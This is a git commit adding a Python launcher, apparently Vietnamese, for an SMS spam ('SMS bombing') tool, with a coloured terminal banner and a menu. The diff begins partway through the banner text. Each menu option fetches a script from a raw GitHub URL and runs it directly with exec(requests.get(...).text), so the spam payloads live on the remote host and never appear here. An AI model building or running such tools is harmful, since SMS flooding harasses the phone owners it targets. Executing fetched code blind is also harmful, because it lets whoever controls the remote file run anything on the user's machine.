c82d5492fc94b7851a3a6b663cc0ee7b10fa70ee
unghia11 <vnghiau2@gmail.com>
2025-06-26 20:00:04 +0700

    Create Sms.py

---
+++ Sms.py
@@ -0,0 +1,34 @@
+5m FB\033[1;31m : \033[1;36mhttps://www.facebook.com/ungnghiaA/
+\033[1;97m[\033[1;91m<>\033[1;97m]\033[1;93m YOUTUBE\033[1;31m : \033[1;32mᰔᩚυиɢнĩα
+\033[1;97m[\033[1;91m<>\033[1;97m]\033[1;32m ADMIN\033[1;31m : \033[1;33mUNGHIA
+\033[97m════════════════════════════════════════════════  
+"""
+
+    for X in banner:
+        sys.stdout.write(X)
+        sys.stdout.flush()
+        sleep(0.00125)
+
+os.system("cls" if os.name == "nt" else "clear")
+banner()
+print("\033[1;31m────────────────────────────────────────────────────────────")
+print (Colorate.Diagonal(Colors.blue_to_purple, "╔═════════════════════╗"))
+print (Colorate.Diagonal(Colors.blue_to_purple, "║  Tool Spam Sms      ║"))
+print (Colorate.Diagonal(Colors.blue_to_purple, "╚═════════════════════╝"))
+print("\033[1;31m[\033[1;37m<>\033[1;31m] \033[1;37m=> \033[1;32mNhập\033[1;36m Số \033[1;31m[\033[1;33m2.1\033[1;31m] \033[1;32mTOOL SPAM SMS \033[1;33m[\033[1;31mV1\033[1;33m] ")
+print("\033[1;31m[\033[1;37m<>\033[1;31m] \033[1;37m=> \033[1;32mNhập\033[1;36m Số \033[1;31m[\033[1;33m2.2\033[1;31m] \033[1;32mTOOL SPAM SMS \033[1;33m[\033[1;31mV2\033[1;33m] ")
+print("\033[1;31m[\033[1;37m<>\033[1;31m] \033[1;37m=> \033[1;32mNhập\033[1;36m Số \033[1;31m[\033[1;33m00\033[1;31m] \033[1;32mTHOÁT TOOL")
+
+print("\033[1;31m────────────────────────────────────────────────────────────")
+
+chon = str(input('\033[1;31m[\033[1;37m<>\033[1;31m] \033[1;37m=> \033[1;32mNhập\033[1;36m Số \033[1;37m: \033[1;33m'))
+
+
+if chon == '00' :
+    exec(requests.get('https://raw.githubusercontent.com/unghia11/gopv4/4f46ff6d1d92d529341c6185993a505692b8f480/00.py').text)
+if chon == '2.1' :
+    exec(requests.get('https://raw.githubusercontent.com/unghia11/gopv4/refs/heads/main/2.1.py').text)
+if chon == '2.2' :
+    exec(requests.get('https://raw.githubusercontent.com/unghia11/gop/refs/heads/main/2.2.py').text)
+else:
+    exit()
